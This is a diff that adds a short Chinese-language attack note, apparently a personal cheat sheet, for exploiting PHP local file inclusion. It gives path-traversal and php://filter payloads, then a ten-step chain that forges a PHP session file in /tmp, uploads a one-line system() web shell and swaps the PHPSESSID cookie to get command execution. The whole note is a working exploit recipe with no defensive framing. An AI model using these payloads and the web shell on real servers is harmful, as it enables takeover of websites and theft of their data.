@@ -1,0 +1,35 @@
+../../../../../../../proc/1/mountinfo
+php://filter/convert.base64-encode/resource=index<br>
+
+
+1. session 位置
+session.save_path = /tmp
+
+2. 確認自己 SESSION
+--> 瀏覽器的 cookie 
+sess_<SESSIONID>
+
+3. LFI 檔案內容 
+sess_0709831c8f3c928531bb086df0e68a83
+/tmp/sess_0709831c8f3c928531bb086df0e68a83
+
+4. 內容
+lang|s:5:"hello";
+
+5. 構造一個 session 
+sess_fei --> 自訂
+
+lang|s:8:"/tmp/fei";
+
+6. 上傳 sess_fei --> /tmp/sess_fei --> 構成 session 的位置
+
+7. 上傳 後門 /tmp/fei.php
+fei.php
+<?php system($_GET['meow']); ?>
+
+8. 回到有弱點的頁面
+
+9. 修改自己的 session 
+開發者工具 application -> storge -> cookie -> PHPSESSID --> fei
+
+10. 回到有弱點的頁面 &meow=ls 拿到 shell
